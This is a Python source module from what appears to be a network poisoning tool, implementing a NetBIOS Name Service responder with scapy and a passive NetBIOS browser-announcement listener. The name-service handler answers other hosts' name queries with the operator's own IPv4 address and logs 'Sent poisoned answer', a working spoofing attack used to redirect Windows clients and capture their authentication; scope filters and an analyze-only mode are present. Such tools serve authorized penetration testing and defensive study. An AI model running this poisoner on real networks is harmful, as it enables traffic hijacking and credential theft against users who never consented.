# Copyright (c) 2025-Present MatrixEditor
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
from typing import List

from scapy.layers import netbios, smb
from rich import markup

from dementor.servers import BaseProtoHandler, ServerThread, ThreadingUDPServer
from dementor.logger import ProtocolLogger
from dementor.config.session import SessionConfig, TomlConfig
from dementor.filters import ATTR_BLACKLIST, ATTR_WHITELIST, in_scope


class NBTNSConfig(TomlConfig):
    _section_ = "NetBIOS"
    _fields_ = [
        ATTR_WHITELIST,
        ATTR_BLACKLIST
    ]


def apply_config(session: SessionConfig) -> None:
    session.netbiosns_config = TomlConfig.build_config(NBTNSConfig)


def create_server_threads(session) -> list:
    servers = []
    if session.nbtns_enabled:
        servers.append(ServerThread(session, NetBiosNSServer))

    if session.nbtds_enabled:
        servers.append(ServerThread(session, NetBiosDatagramService))

    return servers


# Scapy _NETBIOS_SUFFIXES is not complete, See:
# http://www.pyeung.com/pages/microsoft/winnt/netbioscodes.html
# _NETBIOS_SUFFIXES = {
#     # Unique (U):
#     0x4141: "Workstation",
#     0x4141 + 0x01: "Messenger Service",
#     0x4141 + 0x03: "Messenger Service",
#     0x4141 + 0x06: "RAS Server Service",
#     0x4141 + 0x1B: "Exchange MTA",
#     0x4141 + 0x1F: "NetDDE Service",
#     0x4141 + 0x20: "File Server Service",
#     0x4141 + 0x21: "RAS Client Service",
#     0x4141 + 0x22: "Exchange Interchange Service",
#     0x4141 + 0x23: "Exchange Store",
#     0x4141 + 0x24: "Exchange Directory",
#     0x4141 + 0x30: "Modern Sharing Server Service",
#     0x4141 + 0x31: "Modern Sharing Client Service",
#     0x4141 + 0x43: "SMS Client Remote Control",
#     0x4141 + 0x44: "SMS Admin Remote Control Tool",
#     0x4141 + 0x45: "SMS Client Remote Chat",
#     0x4141 + 0x46: "SMS Client Remote Transfer",
#     0x4141 + 0x4C: "DEC Pathworks TCP/IP Service",
#     0x4141 + 0x52: "DEC Pathworks TCP/IP Service",
#     0x4141 + 0x6A: "Exchange IMC",
#     0x4141 + 0x87: "Exchange MTA",
#     0x4141 + 0xBE: "Network Monitor Agent",
#     0x4141 + 0xBF: "Network Monitor Apps",
# }


class NetBiosNSPoisoner(BaseProtoHandler):
    def proto_logger(self):
        return ProtocolLogger(
            extra={
                "protocol": "NetBIOS",
                "protocol_color": "gold3",
                "host": self.client_host,
                "port": 137,
            }
        )

    def handle_data(self, data: bytes, transport) -> None:
        header = netbios.NBNSHeader(data)
        if header.RESPONSE:
            # response sent by server, ignore
            return

        if header.OPCODE == 0x0:
            # name query --> this is what we are looking for
            if header.haslayer(netbios.NBNSNodeStatusRequest):
                # we should  handle those too
                return

            request = header[netbios.NBNSQueryRequest]
            suffix = netbios._NETBIOS_SUFFIXES.get(
                request.SUFFIX,
                hex(request.SUFFIX - 0x4141),
            )
            qrtype = netbios._NETBIOS_QRTYPES.get(
                request.QUESTION_TYPE,
                request.QUESTION_TYPE,
            )
            name = request.QUESTION_NAME.decode("utf-8", errors="replace")

            self.logger.display(
                f"Name Query: \\\\{markup.escape(name)} ({suffix}) (qtype: {qrtype})"
            )
            if self.config.analysis:
                # Analyze-only mode
                return

            # send answer if in scopre
            if not in_scope(name, self.config.netbiosns_config) or not in_scope(
                self.client_host, self.config.netbiosns_config
            ):
                return

            answer = self.build_answer(request, header.NAME_TRN_ID)
            transport.sendto(answer.build(), self.client_address)
            self.logger.success(f"Sent poisoned answer to {self.client_host}")

    def build_answer(self, request, trn_id):
        # simply put our IPv4 address into the answer section
        response = netbios.NBNSHeader() / netbios.NBNSQueryResponse(
            RR_NAME=request.QUESTION_NAME,
            SUFFIX=request.SUFFIX,
            ADDR_ENTRY=[netbios.NBNS_ADD_ENTRY(NB_ADDRESS=self.config.ipv4)],
        )

        response.NAME_TRN_ID = trn_id
        return response


# Unfortunately, Scapy does not define the ServerType flags for [MS-BRWS]. See:
# https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rap/2258bd8d-f17b-45a9-a75e-3e770bc3ad07
_BWRS_SERVER_TYPES = {
    (1 << 0): "Workstation",  # SV_TYPE_WORKSTATION
    (1 << 1): "Server",  # SV_TYPE_SERVER
    (1 << 2): "SQL Server",  # SV_TYPE_SQLSERVER
    (1 << 3): "Domain Controller",  # SV_TYPE_DOMAIN_CTRL
    (1 << 4): "Backup Domain Controller",  # SV_TYPE_DOMAIN_BAKCTRL
    (1 << 5): "Time Source",  # SV_TYPE_TIME_SOURCE
    (1 << 6): "Apple File Protocol Server",  # SV_TYPE_AFP
    (1 << 7): "Novell Server",  # SV_TYPE_NOVELL
    (1 << 8): "Domain Member",  # SV_TYPE_DOMAIN_MEMBER
    (1 << 9): "Print Queue Server",  # SV_TYPE_PRINTQ_SERVER
    (1 << 10): "Dial-in Server",  # SV_TYPE_DIALIN_SERVER
    (1 << 11): "XENIX / UNIX Server",  # SV_TYPE_XENIX
    (1 << 12): "NT Workstation",  # SV_TYPE_NT
    (1 << 13): "WFW Server",  # SV_TYPE_WFW
    (1 << 14): "NetWare",  # SV_TYPE_SERVER_MFPN
    (1 << 15): "NT Server",  # SV_TYPE_NT_SERVER
    (1 << 16): "Browser Server",  # SV_TYPE_POTENTIAL_BROWSER
    (1 << 17): "Backup Browser Server",  # SV_TYPE_BACKUP_BROWSER
    (1 << 18): "Master Browser Server",  # SV_TYPE_MASTER_BROWSER
    (1 << 19): "Domain Master Browser Server",  # SV_TYPE_DOMAIN_MASTER
    (1 << 20): "W9indows95+",  # SV_TYPE_WINDOWS
    (1 << 21): "DFS",  # SV_TYPE_DFS
    (1 << 22): "Server Clusters",  # SV_TYPE_CLUSTER_NT
    (1 << 23): "Terminal Server",  # SV_TYPE_TERMINAL_SERVER
    (1 << 24): "Virtual Server Clusters",  # SV_TYPE_CLUSTER_VS_NT
    (1 << 25): "IBM DSS",  # SV_TYPE_DCE
    # other flags are not relevant here
}


class NetBiosDSPoisoner(BaseProtoHandler):
    def proto_logger(self) -> ProtocolLogger:
        return ProtocolLogger(
            extra={
                "protocol": "Browser",
                "protocol_color": "light_goldenrod3",
                "host": self.client_host,
                "port": 138,
            }
        )

    def get_browser_server_types(self, server_type: int) -> List[str]:
        mask = 1
        value = server_type
        server_types = []
        while value > 0:
            if value & 1 and mask in _BWRS_SERVER_TYPES:
                server_types.append(_BWRS_SERVER_TYPES[mask])
            mask <<= 1
            value >>= 1

        return server_types

    def handle_data(self, data: bytes, transport) -> None:
        # we're just her to inspect packets, no poisoning
        datagram = netbios.NBTDatagram(data)

        if not datagram.haslayer(smb.SMB_Header):
            # probably something else, ignore that
            return

        source_name = datagram.SourceName.decode("utf-8", errors="replace")
        # destination is not necessary as it should be the local master browser

        transaction = datagram[smb.SMBMailslot_Write]
        slot_name = transaction.Name.decode("utf-8", errors="replace")
        if slot_name != "\\MAILSLOT\\BROWSE":
            # not a browser request, ignore
            return

        buffer = transaction.Buffer
        if len(buffer) < 1 and len(buffer[0]) != 2:
            # REVISIT: maybe log that
            return

        brws: smb.BRWS = transaction.Buffer[0][1]
        # only inspect HostAnnouncement for now
        if brws.OpCode != 0x01:
            return

        source_types = self.get_browser_server_types(brws.ServerType)
        if len(source_types) > 3:
            # REVISIT: maybe add complete logging output if --debug is active
            source_types = source_types[:3] + ["..."]

        fmt_source_types = ", ".join([f"[b]{t}[/b]" for t in source_types])
        source_version = f"{brws.OSVersionMajor}.{brws.OSVersionMinor}"
        self.logger.display(
            f"HostAnnouncement: [i]{markup.escape(source_name)}[/i] (Version: "
            f"[bold blue]{source_version}[/bold blue]) "
            f"({fmt_source_types})"
        )


class NetBiosNSServer(ThreadingUDPServer):
    default_port = 137  # name service
    default_handler_class = NetBiosNSPoisoner
    ipv4_only = True
    service_name = "NetBIOS-NS"


class NetBiosDatagramService(ThreadingUDPServer):
    default_port = 138  # datagram service
    default_handler_class = NetBiosDSPoisoner
    ipv4_only = True
    service_name = "NetBIOS-DS"
